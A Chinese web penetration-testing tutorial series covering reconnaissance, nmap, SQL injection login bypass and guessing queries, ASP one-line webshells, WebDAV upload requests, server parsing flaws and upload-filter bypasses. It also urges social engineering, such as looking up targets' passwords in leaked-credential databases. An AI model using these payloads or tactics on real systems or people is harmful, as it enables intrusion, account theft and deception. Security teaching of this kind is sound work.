<h3 id="软件的使用"><a href="#软件的使用" class="headerlink" title="软件的使用"></a>软件的使用</h3><p>软件有很多个,小编推荐burp suite是一款很强大的渗透工具。但是由于burp的安装要在JAVA环境,且工具界面内容为英语。而fiddler有汉化版,EXE文件现下现用。小编觉得如果是体验本章的逻辑和应用的话,还是fiddler是个很不错的选择。至于软件的使用,由于时间和本人较懒和条件有限的问题,请参考：<a href="http://m.cr173.com/w/15341" target="_blank" rel="noopener">http://m.cr173.com/w/15341</a></p>
<p>其实教程网上很多的,甚至不需要看教程,Fd摸一下就明白了</p>
<p>如果真的需要或者不懂的,可以在下方评论,小编会抽空录个视频。QQ2780217151</p>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>说了那么多,我觉得还是不够,别以为你们看懂了就是看懂了。这东西要多接触,多动手,多实践。介于本篇是说明原理,有些读者可能没有练手的地方。小编决定,在短期内收集和编写一些早期的网站程序源码（漏洞多的源码）,给大家动手实验。</p>
<h1 id="第四篇-Web安全之信息探测"><a href="#第四篇-Web安全之信息探测" class="headerlink" title="第四篇-Web安全之信息探测"></a>第四篇-Web安全之信息探测</h1><p>Web之信息探测,从这篇开始就正式进入了Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a><a href="http://www.yuntest.org/archives/tag/shi-zhan/" target="_blank" rel="noopener">实战</a>过程了,嗯,前面都是讲基础,下面我们来讲Web中的信息探测。</p>
<h2 id="信息探测-主要的目的"><a href="#信息探测-主要的目的" class="headerlink" title="信息探测,主要的目的"></a>信息探测,主要的目的</h2><ul>
<li>收集目标<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>系统信息（IP,服务器所用系统等）</li>
<li>收集目标网站子域名</li>
<li>收集目标服务器开放的端口</li>
<li>搞清楚目标域名信息、目标网站内容管理系统等,因为很多系统都是有漏洞发布过的。</li>
</ul>
<p>在对某目标进行<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>时,有时候这些信息有时候对我们有意想不到的好处。收集好了记得打草稿</p>
<h2 id="利用搜索引擎进行信息探测"><a href="#利用搜索引擎进行信息探测" class="headerlink" title="利用搜索引擎进行信息探测"></a>利用搜索引擎进行信息探测</h2><p>我们没办法把所有的子域名全部找出来，但是我们可以找的只是被搜索引擎收录的域名。利用搜索引擎。推荐谷歌</p>
<ul>
<li>site:域名 如site:baidu.com 搜索该域名下的所有网页</li>
</ul>
<ul>
<li>intitle：<a href="http://www.yuntest.org/archives/tag/hou-tai/" target="_blank" rel="noopener">后台</a><a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a></li>
</ul>
<p>可以把搜索结果限定在网页标题的查询上。</p>
<ul>
<li>intitle：index of</li>
</ul>
<p>可找到很多目录遍历漏洞网站</p>
<p>index of是 <a href="http://www.yuntest.org/archives/tag/web/" target="_blank" rel="noopener">WEB</a>服务器的目录列表，而intitle:index of就是搜索指定网页标题为index of的内容，所以就可以搜索到那些允许目录遍历的服务器内容。</p>
<ul>
<li>inurl：admin</li>
</ul>
<p>搜索查询词出现在url中的页面。</p>
<p>这些都是我们渗透过程中常用的语法,还有更多语法,我们可以把他们互相搭配,达到我们想要的效果。如：</p>
<p>intitle:后台 site:域名</p>
<p>这样可以搜索标题内包含：后台 且域名内包含我们搜索的域名的URL</p>
<h2 id="子域名在线查询工具"><a href="#子域名在线查询工具" class="headerlink" title="子域名在线查询工具"></a>子域名在线查询工具</h2><p>如站长之家域名信息查询</p>
<p>whois查询</p>
<p>“whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。</p>
<p>简单说，whois就是一个用来查询域名是否已经被注册，</p>
<p>以及注册域名的详细信息的<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>（如域名所有人、域名注册商）。</p>
<p>whois查询可以对域名的所有者信息、注册商、域名服务器等信息进行查询</p>
<p>得到简单信息之后我们可以对他进行社工,获取更多信息。比方说用邮箱,去社工库查<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>,去他<a href="http://www.yuntest.org/archives/tag/qqkong-jian/" target="_blank" rel="noopener">QQ空间</a>查信息,以及评论他说说的朋友的信息,加他的QQ含有欺骗,可以无限扩大～谈起社工我就激情澎湃。得到它的名字和生日和手机号码等等等等～用字典生成相关的<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>（读者们中枪没？反正有一些人的密码无非如此）</p>
<h2 id="工具的利用"><a href="#工具的利用" class="headerlink" title="工具的利用"></a>工具的利用</h2><p>我们说过了搜索语法的应用, 但是搜索引擎不是万能的, 做过网站的都知道, 搜索引擎会遵循robots.txt里面的规则,如果robots文件禁止搜索引擎蜘蛛爬指定目录,那么搜索引擎就不会爬。</p>
<p>那我们就要应用到工具了,这里推荐一款工具 nmap  。这个nmap拥有扫描之王的称号。他拥有以下功能：</p>
<ul>
<li>检测活在网络上的主机（主机发现）；</li>
<li>检测主机上开放的端口（端口发现或枚举）；</li>
<li>检测到相应的端口（服务发现）的软件和版本；</li>
<li>检测操作系统，硬件地址，以及软件版本；</li>
<li>检测脆弱性的漏洞（Nmap的脚本）。</li>
</ul>
<h3 id="nmap使用命令："><a href="#nmap使用命令：" class="headerlink" title="nmap使用命令："></a>nmap使用命令：</h3><ul>
<li>nmap 192.168.1.1 扫描目标系统1-10000范围内所开放的端口。</li>
<li>nmap -p1-100 192.168.1.1</li>
</ul>
<p>默认扫描目标1-10000范围内的端口号。-p 可以自定义设置我们要扫描的端口。-p1-100就是扫描1到100的端口。</p>
<ul>
<li>nmap -p80、443、21 192.168.1.1</li>
</ul>
<p>端口指定扫描，指定对一些你需要扫描的端口进行扫描。</p>
<ul>
<li>nmap -sP 192.168.1.1/24</li>
</ul>
<p>扫描整个网段,后面的24是你自己设置的子网掩码</p>
<ul>
<li>nmap -O 192.168.1.1</li>
</ul>
<p>操作系统类型的探测,目标系统操作系统类型的探测</p>
<p>这里我就不一一详谈了,工具我就挑一个推荐给大家,其实还有很多工具。在这里小编就列举几个好用的给大家</p>
<p>\1. Nikto</p>
<p>这是一个开源的Web服务器扫描程序，它可以对Web服务器的多种项目(包括3500个潜在的危险文件/CGI，以及超过900个服务器版本，还有250多个服务器上的版本特定问题)进行全面的<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>。其扫描项目和插件经常更新并且可以自动更新(如果需要的话)。</p>
<p>Nikto可以在尽可能短的周期内<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>你的Web服务器，这在其日志文件中相当明显。不过，如果你想试验一下(或者测试你的IDS系统)，它也可以支持LibWhisker的反IDS方法。</p>
<p>不过，并非每一次检查都可以找出一个<a href="http://www.yuntest.org/archives/tag/an-quan/" target="_blank" rel="noopener">安全</a>问题，虽然多数情况下是这样的。有一些项目是仅提供信息(“info only” )类型的检查，这种检查可以查找一些并不存在安全漏洞的项目，不过Web管理员或安全工程师们并不知道。这些项目通常都可以恰当地标记出来。为我们省去不少麻烦。</p>
<p>\2. Paros proxy</p>
<p>这是一个对Web应用程序的漏洞进行评估的代理程序，即一个基于Java的web代理程序，可以评估Web应用程序的漏洞。它支持动态地编辑/查看<a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>/HTTPS,从而改变cookies和表单字段等项目。它包括一个Web通信记录程序，Web圈套程序(spider)，hash 计算器，还有一个可以测试常见的Web应用程序<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>(如SQL<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>式攻击和跨站脚本攻击)的扫描器。</p>
<p>\3. WebScarab</p>
<p>它可以分析使用HTTP 和HTTPS协议进行通信的应用程序，WebScarab可以用最简单地形式记录它观察的会话，并允许操作人员以各种方式观查会话。如果你需要观察一个基于HTTP(S)应用程序的运行状态，那么WebScarabi就可以满足你这种需要。不管是帮助开发人员调试其它方面的难题，还是允许安全专业人员识别漏洞，它都是一款不错的工具。</p>
<p>\4. WebInspect</p>
<p>这是一款强大的Web应用程序扫描程序。SPI Dynamics的这款应用程序安全评估工具有助于确认Web应用中已知的和未知的漏洞。它还可以检查一个Web服务器是否正确配置，并会尝试一些常见的Web攻击，如参数注入、跨站脚本、目录遍历攻击(directory traversal)等等。</p>
<p>\5. Whisker/libwhisker</p>
<p>Libwhisker是一个Perla模块，适合于HTTP测试。它可以针对许多已知的安全漏洞，测试HTTP服务器，特别是检测危险CGI的存在。Whisker是一个使用libwhisker的扫描程序。</p>
<p>\6. Burpsuite</p>
<p>这是一个可以用于攻击Web应用程序的集成平台。Burp套件允许一个攻击者将人工的和自动的技术结合起来，以列举、分析、攻击Web应用程序，或利用这些程序的漏洞。各种各样的burp工具协同工作，共享信息，并允许将一种工具发现的漏洞形成另外一种工具的基础。</p>
<p>\7. Wikto</p>
<p>可以说这是一个Web服务器评估工具，它可以检查Web服务器中的漏洞，并提供与Nikto一样的很多功能，但增加了许多有趣的功能部分，如后端miner和紧密的Google集成。它为MS.NET<a href="http://www.yuntest.org/archives/tag/huan-jing/" target="_blank" rel="noopener">环境</a>编写，但用户需要注册才能<a href="http://www.yuntest.org/archives/tag/xia-zai/" target="_blank" rel="noopener">下载</a>其二进制文件和源<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>。</p>
<p>\8. Acunetix Web Vulnerability Scanner</p>
<p>这是一款商业级的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注入、跨站脚本攻击、身份验证页上的<a href="http://www.yuntest.org/archives/tag/ruo-kou-ling/" target="_blank" rel="noopener">弱口令</a>长度等。它拥有一个操作方便的图形用户界面，并且能够创建专业级的Web站点安全审核报告。</p>
<p>\9. Watchfire AppScan</p>
<p>这也是一款商业类的Web漏洞扫描程序。AppScan在应用程序的整个开发周期都提供安全测试，从而测试简化了部件测试和开发早期的安全保证。它可以扫描许多常见的漏洞，如跨站脚本攻击、HTTP响应拆分漏洞、参数篡改、隐式字段处理、<a href="http://www.yuntest.org/archives/tag/hou-men/" target="_blank" rel="noopener">后门</a>/调试选项、缓冲区溢出等等。</p>
<p>\10. N-Stealth</p>
<p>N-Stealth是一款商业级的Web服务器安全扫描程序。它比一些<a href="http://www.yuntest.org/archives/tag/mian-fei/" target="_blank" rel="noopener">免费</a>的Web扫描程序，如Whisker/libwhisker、 Nikto等的升级频率更高，它宣称含有“30000个漏洞和漏洞程序”以及“每天增加大量的漏洞检查”，不过这种说法令人质疑。还要注意，实际上所有通用的VA工具，如Nessus, ISS Internet Scanner, Retina, SAINT, Sara等都包含Web 扫描部件。(虽然这些工具并非总能保持软件更新，也不一定很灵活。)N-Stealth主要为Windows平台提供扫描，但并不提供源<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>。</p>
<p>工具的好处不仅仅可以扫描目录,还可以对网站的程序脚本进行分析,检测漏洞,还可以直接用工具进行漏洞利用。所以小编在这里特别推荐3个小编特别热爱的工具</p>
<p>1.<a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;tn=monline_dg&amp;wd=burpsuite%E6%95%99%E7%A8%8B&amp;oq=burpsuite%25E4%25BB%258B%25E7%25BB%258D&amp;rsv_pq=a8fb405100022042&amp;rsv_t=826b%2Fq1k6Wh6fboaI9QattTUK3TV9DGxhBFce9FMaOucB8w05vnF54TKDmEn77DqKg&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=2216&amp;rsv_sug3=24&amp;rsv_sug1=21&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2309" target="_blank" rel="noopener">BURP SUITE</a>名副其实web安全工具中排名第一&lt;之前有推荐过&gt;</p>
<p>2.<a href="http://www.yuntest.org/archives/865" target="_blank" rel="noopener">AppScan扫描工具</a></p>
<p>3.<a href="http://www.yuntest.org/archives/160" target="_blank" rel="noopener">JSKY</a></p>
<p>其中第2.3都是中文界面而且安装方便，适合新手。其实软件的功能和效果差不多。不过相对来说国外的工具比我们国内的好很多，特别是nmap、burp suite 。小编建议大家多了解并使用一下国外工具。并且在众多工具中挑选一款合适自己的。</p>
<p>工具的<a href="http://www.yuntest.org/archives/tag/xia-zai/" target="_blank" rel="noopener">下载</a>，可以通过百度下载,也可以在本博客的分类目录里寻找</p>
<h1 id="第五篇-SQL注入的原理"><a href="#第五篇-SQL注入的原理" class="headerlink" title="第五篇-SQL注入的原理"></a>第五篇-SQL注入的原理</h1><p>哈哈哈，讲到注入了。我想给大家讲注入的原理。这个我们前面的前言篇就说过,所谓的SQL注入就是,绕过<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>验证机制直接执行SQL语句。怎么说呢,我们先讲一个概念吧！</p>
<h2 id="网站和网页的区别"><a href="#网站和网页的区别" class="headerlink" title="网站和网页的区别"></a>网站和网页的区别</h2><p>单纯的网页是静态的,html就是静态的,一些简单的网站（如某些<a href="http://www.yuntest.org/archives/tag/yin-dao-ye/" target="_blank" rel="noopener">引导页</a>）只有网页和网页之间的跳转。而网站是动态的,是一个整体性的web应用程序,几乎所有的网站都要用到<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>。数据库我们怎么利用呢？例如某些博客站,cms站点。它的文章并不是存在网站目录里的,而是存在数据库里的,例如某些cms是通过后缀?id=321来调用数据库内的文章内容。此时便是向数据库传递变量为ID值为321请求,而数据库会响应并查询我们的请求。</p>
<p>总体来说原理就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在<a href="http://www.yuntest.org/archives/tag/an-quan/" target="_blank" rel="noopener">安全</a><a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>比方说我们在某网站后台<a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a>界面,有两条输入框,一条是帐号一条是<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>。那么我们可以猜测数据库中有一个admin表，表里面有两个字段username和password 。这样我们输入用户（比如123）<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>（比如456）并提交之后,数据库就会执行一段查询语句:</p>
<p>select id from users where username = ‘123 and password = ‘123’</p>
<p>并判断用户名123是错误的（为假）</p>
<p>之后返回帐号密码错误信息。</p>
<p>那么如果我们在用户名处输入’or 1=1– 而密码随便输入个456呢？ 我们来看看数据库中的查询语句：</p>
<p>select id from users where username = ‘’ or 1=1–  and password = ‘456’</p>
<p>‘又 这里呢1=1永远为真,后面 and password = ‘456’被注释掉了。数据库不需要考虑,这里我们就跳过了验证。</p>
<p>这就是几年前的万能密码,这里只是说说逻辑。我们再来看看下面另一个例子。</p>
<h2 id="整型参数的判断"><a href="#整型参数的判断" class="headerlink" title="整型参数的判断"></a>整型参数的判断</h2><p>SQL注入一般存在于形如：</p>
<p><a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>://www.xxx.xxx/text.asp?id=XX</p>
<p>这种带有参数的asp或者动态网页中，注入又分为整形注入和字符串注入。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。下以HTTP://www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。</p>
<p>当输入的参数xx为整型时，通常test.asp中SQL语句原貌大致如下：</p>
<p>select * from 表名 where 字段=xx</p>
<p>所以可以用以下步骤<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>SQL注入是否存在。</p>
<p>①HTTP://www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了</p>
<p>select * from 表名 where 字段=YY’</p>
<p>数据库无法处理,返回异常；</p>
<p>②HTTP://www.xxx.xxx/test.asp?p=xx and 1=1。1=1为真 test.asp运行正常，而且与没加语句之前的test.asp?p=xx运行结果一样正常显示；</p>
<p>③HTTP://www.xxx.xxx/test.asp?p=YY and 1=2,语句为假,因为1≠2  test.asp运行异常；如果以上三步全面满足，test.asp中一定存在SQL注入<a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>。</p>
<p>小技巧：有时管理员会在后台设置过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种试一试。</p>
<p>大小定混合法：VBS并不区分大小写，而网站程序可能区分。然后程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；</p>
<p>UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息可以参加百度；</p>
<p>ASCII码法：可以把输入的部分或全部字符全部用ASCII码代替，如U=chr(85),a=chr(97)等，ASCII信息参见百度。</p>
<h2 id="猜解内容"><a href="#猜解内容" class="headerlink" title="猜解内容"></a>猜解内容</h2><p>用过明小子、啊D的都知道,存在注入肯定要猜密码了哈哈哈,可是软件是怎样一个工作过程呢？</p>
<p>猜解表名： and exists (select * from 表名)</p>
<p>猜解列名： and exists (select 字段 from 表</p>
<p>爆指定表名内容： and 1=1 union select 1,2,3,4,5 from 表名</p>
<p>猜解列长度 猜解语句： and (select top 1 len(列名)from 表名)&gt;N and (select top 1 len(列名)from 表名)=N 其中N是数字</p>
<p>变换这个N的值猜解列长度，</p>
<p>例如： and (select top 1 len(列名)from 表名)&gt;1 and (select top 1 len(列名)from 表名)&gt;6</p>
<p>如果一直猜到6都显示正常页面，猜到7的时候返回错误（大于6并且小于等于7），那么该列的长度为7。</p>
<p>阿西巴,我好困～～好了这次注入浅谈就说到这里～ 其实网上的注入<a href="http://www.yuntest.org/archives/tag/gong-ju/" target="_blank" rel="noopener">工具</a>还是挺多的, 如<a href="http://www.yuntest.org/archives/tag/pi-liang/" target="_blank" rel="noopener">批量</a>注入的明小子、啊D注入工具、椰树、御剑等等。现在不会语法也没太大关系,以后再补上也行啊。SQL 存在注入的站点小编在博客里也送过了,大家可以找几个练练手（不要干坏事）。</p>
<p>手机一个一个字打,贼几把累（其实抄了一部分）～要是你们还不懂,明天来问我吧</p>
<h1 id="第六篇-上传漏洞之解析漏洞"><a href="#第六篇-上传漏洞之解析漏洞" class="headerlink" title="第六篇-上传漏洞之解析漏洞"></a>第六篇-上传漏洞之解析漏洞</h1><p><a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>漏洞,我们为什么要<a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>？因为我们说过。在网站<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>上 肯定有一个Web容器,它里面装的就是Web应用程序 。某些脚本具有一定的<a href="http://www.yuntest.org/archives/tag/zhi-xing/" target="_blank" rel="noopener">执行</a>和修改<a href="http://www.yuntest.org/archives/tag/quan-xian/" target="_blank" rel="noopener">权限</a>。这些<a href="http://www.yuntest.org/archives/tag/quan-xian/" target="_blank" rel="noopener">权限</a>可以说是服务器给客户端访问时提供的服务的同时提供的, 提供服务越多, 存在漏洞的几率就越大。</p>
<p>如果我们上传了某个具有对系统进行操作性权限的文件（一句话木马,大马,bat,dll等）,那对于我们接下去的<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>提供了很大的方便。</p>
<p>上面这些我就不多说了 ,之前也讲过了。回归正题, 我们这篇要说的是：</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>在这里我先说一个知识点吧,相信很多人都听说过：一句话木马</p>
<p>（PS:可能这篇结构有点乱～）</p>
<p><a href="http://www.yuntest.org/archives/tag/hei-ke/" target="_blank" rel="noopener">黑客</a>在注册信息的电子邮箱或者个人主页等中插入类似如下<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>：</p>
<p>&lt;%execute request(“value”)%&gt;</p>
<p>其中value是值（俗称<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>），你可以更改自己的值，前面的request就是获取这个值</p>
<p>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)</p>
<p>当知道了<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>的URL，就可以利用中国菜刀进行连接得到Webshell,从而拥有读写网站目录的权限（除了部分限权网站,只是简说）。</p>
<p>（不知道数据库也可以，只要知道</p>
<p>&lt;%eval request(“value”)%&gt;</p>
<p>这个文件被插入到哪一个ASP文件里面就可以了）这就被称为一句话木马</p>
<p><a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=https://wapbaike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?adapt=1&amp;fr=aladdin" target="_blank" rel="noopener">想了解更多信息看这里</a></p>
<h2 id="逻辑导航"><a href="#逻辑导航" class="headerlink" title="逻辑导航"></a>逻辑导航</h2><p>文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,从而,黑客可以利用该漏洞实现非法文件的解析。</p>
<p>下面就列举早些年存在至今的解析漏洞：</p>
<p>（大家尽量理解概念）</p>
<h2 id="一、IIS解析漏洞"><a href="#一、IIS解析漏洞" class="headerlink" title="一、IIS解析漏洞"></a>一、IIS解析漏洞</h2><p>1.当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件来解析（如text.asp/1.txt.此处的txt是以ASP文件的影视运行的）</p>
<p>2.当文件为*.asp;1.jpg时，IIS 6.0同样会以ASP脚本来执行。</p>
<p>3.WebDav漏洞（对IIS写权限的利用,这个我们在之前学http请求的时候就说过的请求头和正文语句,这段好好看）</p>
<ul>
<li>第一步，通过OPTIONS探测服务器所支持的<a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>方法</li>
</ul>
<p>请求：</p>
<p>OPTIONS / <a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>/1.1</p>
<p>Host:www.example.com</p>
<p>响应：</p>
<p>Public:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH</p>
<ul>
<li>第二步，通过PUT方法向服务器上传脚本文件</li>
</ul>
<p>请求：</p>
<p>PUT /a.txt HTTP/1.1</p>
<p>Host:www.example.com</p>
<p>Content-Length:30</p>
<p>&lt;%eval request(“chopper”)%&gt;</p>
<p>第三步，通过Move或Copy方法改名</p>
<p>请求：</p>
<p>COPY /a.txt HTTP/1.1</p>
<p>Host:www.example.com</p>
<p>Destination:<a href="http://www.example.com/cmd.asp" target="_blank" rel="noopener">http://www.example.com/cmd.asp</a></p>
<p>第四步，使用DELETE方法，<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>者还可以删除服务器上的任意文件</p>
<p>请求：</p>
<p>DELETE /a.txt HTTP/1.1</p>
<p>Host:www.example.com</p>
<h2 id="二、Apache解析漏洞"><a href="#二、Apache解析漏洞" class="headerlink" title="二、Apache解析漏洞"></a>二、Apache解析漏洞</h2><p>在Apache 1.x和Apache 2.x中1.php.rar会被当作php文件执行。</p>
<p>Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。</p>
<p>例 上传文件：</p>
<p>1.php.aa.bb</p>
<p>后缀名bb 不认识,向前解析</p>
<p>1.php.aa</p>
<p>后缀名aa 不认识 向前解析</p>
<p>1.php 最终解析结果为PHP文件</p>
<p>这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为PHP的文件）</p>
<p>Apache认识的扩展名保存在安装目录下”/conf/mime.types”文件中。下图为本机的情况，文件在路径C:wampbinapacheApache2.2.21confmime.types</p>
<h2 id="三、PHP-CGI解析漏洞"><a href="#三、PHP-CGI解析漏洞" class="headerlink" title="三、PHP CGI解析漏洞"></a>三、PHP CGI解析漏洞</h2><p>在某些使用Nginx的网站中，</p>
<p>访问<a href="http://www.xxser.com/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。" target="_blank" rel="noopener">http://www.xxser.com/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。</a></p>
<p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。</p>
<p>这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。</p>
<p>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</p>
<h1 id="第七篇-上传漏洞之绕过上传漏洞"><a href="#第七篇-上传漏洞之绕过上传漏洞" class="headerlink" title="第七篇-上传漏洞之绕过上传漏洞"></a>第七篇-上传漏洞之绕过上传漏洞</h1><p>前一篇我们已经讲过了上传漏洞的解析漏洞,在某些时候,知道网站存在哪个解析漏洞,那么我们就可以更好的利用上传漏洞</p>
<p>这个知识点在我们前面就有粗略说过了(<a href="http://www.yuntest.org/index.php/archives/765.html" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/765.html</a>), http拦截也是上传漏洞的其中之一, 下面我们来对绕过上传漏洞进行更深的了解。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>管理员防止文件上传漏洞时可以分为两种,一种是客户端检测,一种是服务端检测：</p>
<p>客户端检测：使用JavaScript检测，在文件上传之前,就对文件进行验证</p>
<p>服务器端检测：服务端脚本一般会检测文件的<a href="http://www.yuntest.org/go/?url=https://wapbaike.baidu.com/item/MIME/2900607?adapt=1&amp;fr=aladdin" target="_blank" rel="noopener">MIME类型</a>（这里大家先点过去了解一下mime类型）检测文件扩展名是否合法，甚至有些程序检测文件中是否嵌入恶意代码。</p>
<p>图片一句话:</p>
<p>把一句话木马插入在图片文件中,而且并不损坏图片文件,这一方法可以躲过少许的防火墙检测。再利用解析漏洞得到webshell</p>
<p>推荐一款专业的制作软件：LEdjpgcom</p>
<h3 id="一、客户端检测绕过方法："><a href="#一、客户端检测绕过方法：" class="headerlink" title="一、客户端检测绕过方法："></a>一、客户端检测绕过方法：</h3><p>FireBug插件：将用于检验文件扩展名的onsubmit事件删除。</p>
<p>中间人攻击：使用Burp Suite,首先把木马扩展名改为一张正常图片（图片木马的简介上一篇说过了,大家可以百度加以了解）的扩展名,比如JPG扩展名，,在上传时使用Burp Suite拦截上传数据,再将其中的扩展名JPG修改为PHP，就可以绕过客户端验证。也有可能还需要相应地修改Content-Length（Http知识点,看不明白跑回去看:<a href="http://www.yuntest.org/index.php/archives/686.html" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/686.html</a>)</p>
<p>任何客户端验证都是不安全的,客户端验证是防止用户输入错误,减少服务器开销,而服务器端验证才可以真正防御攻击者。</p>
<p>注：从第一篇一直看到这里的,不理解的去面壁</p>
<h3 id="二、服务器端检测"><a href="#二、服务器端检测" class="headerlink" title="二、服务器端检测"></a>二、服务器端检测</h3><h4 id="白名单与黑名单验证"><a href="#白名单与黑名单验证" class="headerlink" title="白名单与黑名单验证"></a>白名单与黑名单验证</h4><p>黑名单过滤方法：定义不允许上传的文件扩展名</p>
<p>黑名单的绕过方法：</p>
<p>1.攻击者可以从黑名单中找到Web开发人员忽略的扩展名，如：cer</p>
<p>2.对文件的后缀名进行大小写转换，比如黑名单中有php，可以将文件的后缀改为pHp，仅限windows平台</p>
<p>3.在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”与空格，利用此特性也可以绕过黑名单验证。（asp.或asp_）</p>
<p>白名单过滤方法：定义允许上传的文件扩展名</p>
<p>白名单的绕过方法：结合Web容器的解析漏洞</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>php中通过$_FILE[‘file’][‘type’]来检验</p>
<p>绕过方法：可以在Burp Suite中更改Content-Type的内容为image/jpeg</p>
<h4 id="目录验证"><a href="#目录验证" class="headerlink" title="目录验证"></a>目录验证</h4><p>在文件上传时，程序通常允许用户将文件放到指定的目录中，如果指定的目录存在，就将文件写入目录中，不存在的话则先建立目录，然后写入。</p>
<p>比如：在前端的HTML代码中，有一个隐藏标签<input type="”hidden”" name="”Extension”" value="”up”/"></p>
<p>在服务器端有如下代码</p>
<p>if(!is_dir($Extension)){ //如果文件夹不存在，就建立文件夹</p>
<p>mkdir($Extension);</p>
<p>}</p>
<p>攻击者可以利用工具将表单中value的值由“up”改为“pentest.asp”，并上传一句话图片木马文件。</p>
